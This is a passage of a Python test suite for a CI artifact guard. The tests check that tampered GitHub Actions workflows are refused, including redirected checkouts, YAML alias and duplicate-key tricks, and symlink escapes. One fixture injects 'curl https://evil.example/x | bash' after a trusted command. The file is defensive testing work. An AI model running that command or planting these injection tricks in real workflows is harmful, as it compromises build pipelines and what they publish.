            guard.check_guard_placement(Path(tmp))

    def test_binding_name_is_the_dash_level_name_not_a_nested_one(self):
        # MAJOR-1: a name: under with: that appears first must not become the step name.
        text = ('jobs:\n  build:\n    steps:\n      - uses: ' + UPLOAD + '\n        with:\n'
                '          name: z\n          path: build/x\n        name: Y\n')
        self.assertEqual(['Y'], [name for name, _ in guard.upload_steps(text)])

    def test_inline_comment_is_not_part_of_the_name(self):
        # MINOR-1: `name: Save #x` is the name Save.
        text = ('jobs:\n  build:\n    steps:\n      - name: Save #x\n        uses: ' + UPLOAD
                + '\n        with:\n          path: build/x\n')
        self.assertEqual(['Save'], [name for name, _ in guard.upload_steps(text)])

    def test_duplicate_upload_names_in_one_workflow_are_refused(self):
        # MAJOR-1 (second repro): two upload steps with the same name would let the binding check see only one.
        text = GUARDED + '  second:\n    steps:\n' + GUARD_STEP + SAVE_STEP
        self.assertNotEqual([], self.violations(text))

    def test_upload_path_must_be_staged(self):
        unstaged = GUARDED.replace('.artifact-stage/build/x', 'build/x')
        self.assertNotEqual([], self.violations(unstaged))

    def test_trusted_checkout_must_be_the_first_step_of_the_job(self):
        text = ('jobs:\n  build:\n    steps:\n      - name: Build\n        run: make build\n'
                + GUARD_STEP + SAVE_STEP)
        self.assertNotEqual([], self.violations(text))

    def test_guard_call_must_use_trusted_copy_not_workspace_tools(self):
        # The workspace copy (tools/artifact_guard.py in the PR) must never be what a workflow runs.
        old_form = ('jobs:\n  build:\n    steps:\n      - name: Guard\n'
                    '        run: |\n          python3 tools/artifact_guard.py --post-build w.yml "Save"\n'
                    '      - name: Save\n        uses: ' + UPLOAD + '\n        with:\n          path: build/x\n')
        self.assertNotEqual([], self.violations(old_form))

    def test_verify_step_is_required_before_upload(self):
        self.assertNotEqual([], self.violations(GUARDED.replace(VERIFY_STEP, '')))

    def test_trusted_checkout_cannot_be_redirected_away_from_this_repository(self):
        # The trusted checkout's with: inputs were unrestricted, so `repository:` (or token:, ssh-key:, clean:)
        # could fetch the guard from another repository, or leave a planted copy in place: the guard would then be
        # attacker code and every later check would be defeated.
        for extra in ('          repository: attacker/evil-guard\n',
                      '          token: ${{ secrets.X }}\n',
                      '          ssh-key: ${{ secrets.X }}\n',
                      '          clean: false\n'):
            with self.subTest(extra=extra.strip()):
                text = GUARDED.replace('          path: .trusted-main\n',
                                       extra + '          path: .trusted-main\n', 1)
                self.assertNotEqual(GUARDED, text)
                self.assertNotEqual([], self.violations(text))

    def test_trusted_checkout_refuses_a_duplicate_with_key(self):
        # `ref: main` followed by `ref: <pull request>` could override the trusted ref if the YAML parser keeps the
        # last duplicate key, so a repeated with: key is refused.
        duplicate = GUARDED.replace('          ref: main\n',
                                    '          ref: main\n          ref: ${{ github.head_ref }}\n', 1)
        self.assertNotEqual(GUARDED, duplicate)
        self.assertNotEqual([], self.violations(duplicate))
        self.assertEqual([], self.violations(GUARDED))

    def test_trusted_checkout_must_pin_the_guard_file(self):
        # Without the sparse checkout of this exact file, a .trusted-main copy planted by an earlier step would not
        # be overwritten by main, so the guard could run from planted code.
        without = GUARDED.replace('          sparse-checkout: tools/artifact_guard.py\n', '')
        self.assertNotEqual(GUARDED, without)
        self.assertNotEqual([], self.violations(without))
        self.assertEqual([], self.violations(GUARDED))   # the real form still passes

    def test_trusted_run_steps_cannot_be_skipped_or_rerouted(self):
        # The placement check step (and the python resolve) run trusted commands. An if:, continue-on-error:, env:,
        # working-directory or shell: on them could skip the check, swallow its failure or run arbitrary code, while
        # the pure text match on run: still looked correct. Only name, id, run and shell: bash are allowed.
        placement = PLACEMENT_STEP
        self.assertIn(placement, GUARDED)
        placement_bad = {
            'if false': '      - name: Guard placement (trusted)\n        if: ${{ false }}\n        run: ' + CHECK_CALL + '\n',
            'continue-on-error': '      - name: Guard placement (trusted)\n        continue-on-error: true\n        run: ' + CHECK_CALL + '\n',
            'env': '      - name: Guard placement (trusted)\n        env:\n          RUNNER_TEMP: /tmp/x\n        run: ' + CHECK_CALL + '\n',
            'working-directory': '      - name: Guard placement (trusted)\n        working-directory: /tmp\n        run: ' + CHECK_CALL + '\n',
            'shell injection': '      - name: Guard placement (trusted)\n        shell: bash -c "evil"\n        run: ' + CHECK_CALL + '\n',
            'extra key': '      - name: Guard placement (trusted)\n        timeout-minutes: 1\n        run: ' + CHECK_CALL + '\n',
        }
        for label, step in placement_bad.items():
            with self.subTest(step=label):
                text = GUARDED.replace(placement, step)
                self.assertNotEqual(GUARDED, text)
                self.assertNotEqual([], self.violations(text))
        self.assertIn(PY_RESOLVE, GUARDED)
        py_shell = GUARDED.replace(PY_RESOLVE, PY_RESOLVE.replace('        run:', '        shell: bash -c "evil"\n        run:', 1))
        self.assertNotEqual(GUARDED, py_shell)
        self.assertNotEqual([], self.violations(py_shell))

    def test_placement_fails_closed_when_no_workflow_files_are_present(self):
        # A first checkout that fetches no workflow files (or a wrong sparse-checkout) must not turn the trusted
        # placement check into a vacuous pass.
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, '.github', 'workflows').mkdir(parents=True)
            with self.assertRaisesRegex(ValueError, 'no workflow or action files'):
                guard.check_guard_placement(Path(tmp))

    def test_a_second_checkout_cannot_overwrite_the_trusted_copy(self):
        # The trusted copy lives in .trusted-main. A second actions/checkout inserted after it (with ref: the pull
        # request and path: .trusted-main) would replace it with the pull-request tool, which every later trusted
        # step would then run. Only the first two steps may be checkouts; the real form still passes.
        extra = ('      - name: Replace trusted copy\n'
                 '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
                 '        with:\n'
                 '          ref: ${{ github.head_ref }}\n'
                 '          path: .trusted-main\n')
        for anchor in (STAGE_STEP, PLACEMENT_STEP, VERIFY_STEP):
            with self.subTest(anchor=anchor.splitlines()[0]):
                text = GUARDED.replace(anchor, extra + anchor)
                self.assertNotEqual(GUARDED, text)
                self.assertNotEqual([], self.violations(text))
        self.assertEqual([], self.violations(GUARDED))

    def test_a_non_intake_guard_job_cannot_download_an_artifact(self):
        # A guard job that publishes from its own checkout has no reason to download. Allowing it lets a step drop a
        # planted copy (into .trusted-main) that the later trusted steps would run.
        extra = ('      - name: Plant\n'
                 '        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n'
                 '        with:\n'
                 '          name: x\n'
                 '          path: .trusted-main\n')
        text = GUARDED.replace(STAGE_STEP, extra + STAGE_STEP)
        self.assertNotEqual(GUARDED, text)
        self.assertNotEqual([], self.violations(text))

    def test_a_uses_line_inside_a_run_block_cannot_masquerade_as_an_allowed_action(self):
        # Only the step's own top-level uses: key may classify it. A run: body that contains 'uses:
        # actions/configure-pages@v5' must not let the step skip the trusted-run checks.
        evil = ('      - name: Evil\n'
                '        run: |\n'
                '          echo hi\n'
                '          uses: actions/configure-pages@v5\n')
        for action in ('configure-pages', 'deploy-pages'):
            with self.subTest(action=action):
                body = evil.replace('actions/configure-pages@v5', f'actions/{action}@v5')
                text = GUARDED.replace(STAGE_STEP, body + STAGE_STEP)
                self.assertNotEqual(GUARDED, text)
                self.assertNotEqual([], self.violations(text))

    def test_a_glob_that_reaches_through_a_symlinked_directory_is_refused(self):
        # `build/debug/link/*` is globbed through the link, so it could stage a file from outside the checkout. The
        # component is named and refused rather than followed.
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            Path(base, 'outside').mkdir()
            Path(base, 'outside', 'probe.json').write_text('{"x": 1}\n', encoding='utf-8')
            Path(base, 'build', 'debug').mkdir(parents=True)
            try:
                Path(base, 'build', 'debug', 'link').symlink_to(Path(base, 'outside'))
            except (OSError, NotImplementedError):
                self.skipTest('symlinks unavailable on this host')
            count, problems = guard.pattern_problems(base, 'w.yml', 'build/debug/link/*', False)
            self.assertEqual(0, count)
            self.assertTrue(any('symlink' in problem for problem in problems), problems)

    def test_a_configure_pages_step_may_not_carry_extra_inputs(self):
        # configure-pages can run a site generator, so a with: (e.g. one writing into .trusted-main) is refused.
        step = ('      - name: Configure Pages\n        uses: actions/configure-pages@v5\n'
                '        with:\n          output_dir: .trusted-main\n')
        text = GUARDED.replace(STAGE_STEP, step + STAGE_STEP)
        self.assertNotEqual(GUARDED, text)
        self.assertNotEqual([], self.violations(text))

    def test_a_plain_scalar_run_continuation_cannot_spoof_a_trusted_step(self):
        # CRITICAL: an inline `run:` is a YAML plain scalar that continues onto any more-indented line, so the whole
        # command is not the one line the guard matched. A trusted py-resolve step must not accept the exact command
        # plus an injected `; <command>` on the next line.
        injected = ('      - name: Resolve python3 (trusted)\n        id: pyresolve\n'
                    '        run: echo "python=$(command -v python3)" >> "$GITHUB_OUTPUT"\n'
                    '          ; echo INJECTED > /tmp/pwned ; curl https://evil.example/x | bash\n')
        text = GUARDED.replace(PY_RESOLVE, injected)
        self.assertNotEqual(GUARDED, text)
        self.assertNotEqual([], self.violations(text))

    def test_a_decoy_with_inside_a_block_scalar_cannot_fake_the_trusted_checkout(self):
        # CRITICAL: a `name: |` block holding a fake `with:` with the trusted inputs, followed by the real `with:`
        # that adds `repository:`, must not be accepted as the trusted checkout.
        decoy = ('      - name: |\n'
                 '          Trusted guard (main)\n'
                 '          with:\n'
                 '            ref: main\n'
                 '            path: .trusted-main\n'
                 '            sparse-checkout: tools/artifact_guard.py\n'
                 '            sparse-checkout-cone-mode: false\n'
                 '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
                 '        with:\n'
                 '          repository: attacker/evil-guard\n'
                 '          ref: main\n'
                 '          path: .trusted-main\n'
                 '          sparse-checkout: tools/artifact_guard.py\n'
                 '          sparse-checkout-cone-mode: false\n'
                 '          persist-credentials: false\n')
        text = GUARDED.replace(TRUSTED_CHECKOUT, decoy)
        self.assertNotEqual(GUARDED, text)
        self.assertNotEqual([], self.violations(text))

    def test_a_trusted_checkout_hidden_in_a_block_scalar_is_refused(self):
        # MEDIUM: a step whose `uses:`/trusted with: lines live in a `name: |` block and whose real key is `run:` must
        # not count as the trusted checkout (it checks nothing out, so the guard file is not pinned).
        fake = ('      - name: |\n'
                '          with:\n'
                '            ref: main\n'
                '            path: .trusted-main\n'
                '            sparse-checkout: tools/artifact_guard.py\n'
                '            sparse-checkout-cone-mode: false\n'
                '          uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
                '        run: echo "python=$(command -v python3)" >> "$GITHUB_OUTPUT"\n')
        text = GUARDED.replace(TRUSTED_CHECKOUT, fake)
        self.assertNotEqual(GUARDED, text)
        self.assertNotEqual([], self.violations(text))

    def test_an_aliased_with_cannot_smuggle_a_repository_override(self):
        # CRITICAL: `with: *alias` is not a plain block the guard can read, and the anchor may add `repository:`.
        step = ('      - name: |\n'
                '          ref: main\n'
                '          path: .trusted-main\n'
                '          sparse-checkout: tools/artifact_guard.py\n'
                '          sparse-checkout-cone-mode: false\n'
                '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
                '        with: *trusted_inputs\n')
        text = ('x-trusted: &trusted_inputs\n  ref: main\n  path: .trusted-main\n'
                '  sparse-checkout: tools/artifact_guard.py\n  sparse-checkout-cone-mode: false\n'
                '  repository: attacker/evil-guard\n' + GUARDED.replace(TRUSTED_CHECKOUT, step))
        self.assertNotEqual([], self.violations(text))

    def test_the_first_checkout_may_not_be_redirected_away_from_the_pull_request(self):
        # MAJOR: if step 0 checks out main (or another repository), --check-placement reads a different workflow set
        # from the one GitHub runs. Its with: may not carry ref:, repository: or token:/ssh-key:.
        for override in ('          ref: main\n', '          repository: attacker/benign\n',
                         '          token: ${{ secrets.GITHUB_TOKEN }}\n'):
            with self.subTest(override=override):
                text = GUARDED.replace(PR_CHECKOUT, PR_CHECKOUT.replace('          persist-credentials: false\n',
                                                                        override + '          persist-credentials: false\n'))
                self.assertNotEqual(GUARDED, text)
                self.assertNotEqual([], self.violations(text))
        self.assertEqual([], self.violations(GUARDED))

    def test_a_uses_value_with_an_escape_or_alias_is_refused(self):
        # MAJOR: `\x61` in a double-quoted uses value resolves to `a`, so the literal text hides upload-artifact; an
        # alias can point at an anchor defined elsewhere. Both are refused.
        escape = GUARDED.replace('uses: ' + UPLOAD, 'uses: "actions/upload-\\x61rtifact@ea165f8d65b6e75b540449e92b4886f43607fa02"')
        self.assertNotEqual(GUARDED, escape)
        with self.assertRaises(ValueError):
            self.violations(escape)
        alias = 'x-save: &s ' + UPLOAD + '\n' + GUARDED.replace('uses: ' + UPLOAD, 'uses: *s')
        with self.assertRaises(ValueError):
            self.violations(alias)

    def test_a_duplicate_uses_key_masks_the_step_action(self):
        # MEDIUM: a step with two uses: keys is classified by the first, but the YAML parser (last one wins) would run
        # the second (a checkout into .trusted-main).
        text = GUARDED.replace(STAGE_STEP,
                               '      - name: Sneaky\n'
                               '        uses: actions/configure-pages@v5\n'
                               '        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
                               '        with:\n          ref: ${{ github.head_ref }}\n          path: .trusted-main\n'
                               + STAGE_STEP)
        self.assertNotEqual(GUARDED, text)
        self.assertNotEqual([], self.violations(text))



class TrustedCopyTests(unittest.TestCase):
    """A: the guard that decides is the trusted main copy, not a copy in the checked-out workspace."""

    def test_tampered_workspace_copy_does_not_change_the_verdict(self):
        import subprocess
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            Path(root, 'tools').mkdir()
            Path(root, 'tools', 'artifact_guard.py').write_text('import sys\nsys.exit(0)\n', encoding='utf-8')
            Path(root, '.github', 'workflows').mkdir(parents=True)
            Path(root, '.github', 'workflows', 'w.yml').write_text(
                'jobs:\n  build:\n    steps:\n      - name: Save\n        uses: ' + UPLOAD
                + '\n        with:\n          path: build/x.bin\n', encoding='utf-8')
            Path(root, 'build').mkdir()
            Path(root, 'build', 'x.bin').write_bytes(ELF_PROBE)
            result = subprocess.run(
                [sys.executable, str(Path(guard.__file__)), '--root', str(root),
                 '--post-build', '.github/workflows/w.yml', 'Save'],
                capture_output=True, text=True)
            self.assertNotEqual(0, result.returncode, result.stdout + result.stderr)
            self.assertIn('signature', result.stderr)


class StagingTests(unittest.TestCase):
    """B: the uploaded bytes are the staged copies, and a rewrite after staging is detected by verify."""
    WORKFLOW = '.github/workflows/w.yml'

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        Path(self.root, '.github', 'workflows').mkdir(parents=True)
        Path(self.root, self.WORKFLOW).write_text(
            'jobs:\n  build:\n    steps:\n      - name: Save\n        uses: ' + UPLOAD
            + '\n        with:\n          path: .artifact-stage/build/x.json\n', encoding='utf-8')
        Path(self.root, 'build').mkdir()
        Path(self.root, 'build', 'x.json').write_bytes(b'{"ok": true}\n')

    def stage(self):
        guard.stage_artifacts(self.WORKFLOW, 'Save', self.root)

    def verify(self):
        guard.verify_artifacts(self.WORKFLOW, 'Save', self.root)

    def staged(self):
        return Path(self.root, '.artifact-stage', 'build', 'x.json')

    def test_stage_then_verify_passes(self):
        self.stage()
        self.verify()

    def test_rewrite_of_the_staged_copy_after_staging_is_detected(self):
        self.stage()
        self.staged().write_bytes(b'rewritten by a background process')
        with self.assertRaises(ValueError):
            self.verify()

    def test_extra_file_added_to_staging_is_detected(self):
        self.stage()
        Path(self.root, '.artifact-stage', 'extra.bin').write_bytes(b'x')
        with self.assertRaises(ValueError):
            self.verify()

    def test_deleted_staged_file_is_detected(self):
        self.stage()
        self.staged().unlink()
        with self.assertRaises(ValueError):
            self.verify()

    def test_workspace_rewrite_after_staging_does_not_change_the_staged_copy(self):
        self.stage()
        Path(self.root, 'build', 'x.json').write_bytes(b'changed in the workspace')
        self.verify()

    def test_preexisting_staging_content_is_discarded(self):
        Path(self.root, '.artifact-stage').mkdir()
        Path(self.root, '.artifact-stage', 'evil.bin').write_bytes(b'pre-created by a build step')
        self.stage()
        self.assertFalse(Path(self.root, '.artifact-stage', 'evil.bin').exists())

    def test_stage_refuses_a_linked_executable_and_stages_nothing(self):
        Path(self.root, 'build', 'x.json').write_bytes(ELF_PROBE)
        with self.assertRaises(ValueError):
            self.stage()
        self.assertFalse(self.staged().exists())

    def test_a_symlinked_directory_injected_into_staging_is_detected(self):
        # os.walk lists a symlinked directory without entering it and _entry_files sees only filenames, so a link
        # planted in the staging tree between stage and verify would otherwise be invisible (it could redirect an
        # upload outside the checkout). verify must name it.
        self.stage()
        try:
            Path(self.root, '.artifact-stage', 'link').symlink_to(Path(self.root, 'build'))
        except (OSError, NotImplementedError):
            self.skipTest('symlinks unavailable on this host')
        with self.assertRaisesRegex(ValueError, 'symlink'):
            self.verify()


BUILD_STEPS = ('      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n'
               '        with:\n          persist-credentials: false\n'
               '      - name: Build\n        run: make build\n'
               '      - name: Hand off\n        run: |\n          mkdir -p intermediate\n          cp --parents build/x.json intermediate/\n'
               '      - name: Intermediate\n        uses: ' + UPLOAD + '\n        with:\n          name: intermediate-x\n          path: intermediate/\n')
GUARD_STEPS = (PR_CHECKOUT + TRUSTED_CHECKOUT + PY_RESOLVE + PLACEMENT_STEP
               + '      - name: Download\n        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0\n'
               '        with:\n          name: intermediate-x\n          path: .intake\n'
               '      - name: Stage\n        run: |\n          ' + guard.INTAKE_PY + ' --stage w.yml "Save"\n'
               '      - name: Verify\n        run: |\n          ' + guard.INTAKE_PY + ' --verify w.yml "Save"\n'
               '      - name: Save\n        uses: ' + UPLOAD + '\n        with:\n          name: final\n'
               '          path: .intake/.artifact-stage/build/x.json\n')
BUILD_JOB = '  build:\n    steps:\n' + BUILD_STEPS
GUARD_JOB = '  publish:\n    needs: build\n    steps:\n' + GUARD_STEPS
SEPARATED = 'jobs:\n' + BUILD_JOB + GUARD_JOB


class JobSeparationTests(unittest.TestCase):
    """Build and publish live in different jobs; the guard job runs only trusted steps and needs its producer."""

    def violations(self, text):
        return guard.guard_placement_violations(text, 'w.yml')

    def test_separated_build_and_guard_jobs_pass(self):
        self.assertEqual([], self.violations(SEPARATED))

    def test_build_and_publish_in_one_job_is_refused(self):
        self.assertNotEqual([], self.violations('jobs:\n  build:\n    steps:\n' + BUILD_STEPS + GUARD_STEPS))

    def test_guard_job_cannot_run_build_code(self):
        text = 'jobs:\n' + BUILD_JOB + GUARD_JOB.replace(
            '      - name: Download', '      - name: Build again\n        run: make build\n      - name: Download', 1)
        self.assertNotEqual([], self.violations(text))

    def test_guard_job_must_need_the_build_job(self):
        self.assertNotEqual([], self.violations('jobs:\n' + BUILD_JOB + GUARD_JOB.replace('    needs: build\n', '', 1)))

    def test_intermediate_artifact_must_be_consumed(self):
        self.assertNotEqual([], self.violations('jobs:\n' + BUILD_JOB))

    def test_download_must_use_the_intake_root(self):
        text = 'jobs:\n' + BUILD_JOB + GUARD_JOB.replace('path: .intake', 'path: .', 1)
        self.assertNotEqual([], self.violations(text))

    def test_stage_must_use_the_intake_root(self):
        text = 'jobs:\n' + BUILD_JOB + GUARD_JOB.replace(guard.INTAKE_PY + ' --stage', guard.TRUSTED_PY + ' --stage', 1)
        self.assertNotEqual([], self.violations(text))

    def test_build_job_must_not_run_the_guard(self):
        text = ('jobs:\n' + BUILD_JOB + '      - name: Guard\n        run: ' + guard.TRUSTED_PY + ' --stage w.yml "Save"\n'
                + GUARD_JOB)
        self.assertNotEqual([], self.violations(text))

    def test_final_upload_must_come_from_the_intake_stage(self):
        text = 'jobs:\n' + BUILD_JOB + GUARD_JOB.replace(
            '.intake/.artifact-stage/build/x.json', 'build/x.json', 1)
        self.assertNotEqual([], self.violations(text))

class UnlistedRouteTests(unittest.TestCase):
    """Issue #337: a publication route the guard does not name is refused (fail closed) by both layers."""
    CHECKOUT = 'actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683'
    RELEASE = 'marvinpinto/action-automatic-releases@v1'

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        (self.root / '.github' / 'workflows').mkdir(parents=True)
        self.write_build('build/debug/x.pce', FIXTURE_PCE)

    def write_build(self, relative, data):
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)

    def write(self, text, name='ci.yml'):
        (self.root / '.github' / 'workflows' / name).write_text(text, encoding='utf-8')

    def assert_refused(self, text, name='ci.yml'):
        self.write(text, name)
        with self.assertRaises(ValueError):
            guard.check_upload_artifacts(self.root)
        with self.assertRaises(ValueError):
            guard.check_guard_placement(self.root)

    def test_unlisted_release_action_is_refused_in_every_spelling(self):
        # Regression (#337 INFO-3): a release action is not an upload-artifact step and matched no keyword, so it
        # passed both layers. Every spelling of a uses: key that names an unlisted action must be refused.
        base = workflow(['build/debug/*.pce'])
        spellings = {
            'block key': f'      - name: Release\n        uses: {self.RELEASE}\n',
            'spaced colon': f'      - name: Release\n        uses : {self.RELEASE}\n',
            'quoted key': f'      - name: Release\n        "uses": "{self.RELEASE}"\n',
            'flow mapping': f'      - {{name: Release, uses: {self.RELEASE}}}\n',
            'folded scalar': f'      - name: Release\n        uses: >-\n          {self.RELEASE}\n',
            'value on next line': f'      - name: Release\n        uses:\n          {self.RELEASE}\n',
            'uppercase name': '      - name: Release\n        uses: Marvinpinto/Action-Automatic-Releases@v1\n',
            'trailing comment': f'      - name: Release\n        uses: {self.RELEASE} # pinned later\n',
            'no ref': '      - name: Release\n        uses: marvinpinto/action-automatic-releases\n',
        }
        for label, step in spellings.items():
            with self.subTest(spelling=label):
                self.assert_refused(base + step, name='rel.yaml')

    def test_two_uses_keys_on_one_flow_line_are_both_checked(self):
        text = ('jobs:\n  build:\n    steps: [{uses: ' + self.CHECKOUT + '}, {uses: ' + self.RELEASE + '}]\n'
                '  save:\n    steps:\n      - name: Save\n        uses: ' + UPLOAD + '\n        with:\n'
                '          path: |\n            build/debug/*.pce\n')
        self.assert_refused(text)

    def test_run_routes_to_github_releases_or_uploads_are_refused(self):
        for line in ('run: curl -X POST https://uploads.github.com/repos/o/r/releases/1/assets --data-binary @x',
                     'run: gh api repos/o/r/releases -f tag_name=v1',
                     'run: curl https://api.github.com/repos/o/r/releases'):
            with self.subTest(line=line):
                self.assert_refused(workflow(['build/debug/*.pce']) + f'      - name: Publish\n        {line}\n')

    def test_upper_case_workflow_extension_is_scanned(self):
        # Review-style gap: glob was case-sensitive on Linux, so extra.YML was never read.
        self.write(workflow(['build/debug/*.pce']))
        self.write(workflow(['build/probe/*']), name='extra.YML')
        self.write_build('build/probe/linked-probe', ELF_PROBE)
        with self.assertRaisesRegex(ValueError, 'extra.YML'):
            guard.check_upload_artifacts(self.root)

    def test_allowlisted_build_and_pages_actions_still_pass(self):
        text = ('jobs:\n  build:\n    steps:\n'
                f'      - uses: {self.CHECKOUT}\n'
                '      - uses: actions/configure-pages@v5\n'
                f'      - name: Save\n        uses: {UPLOAD}\n        with:\n          path: |\n            build/debug/*.pce\n')
        self.write(text)
        guard.check_upload_artifacts(self.root)


if __name__ == '__main__':
    unittest.main()
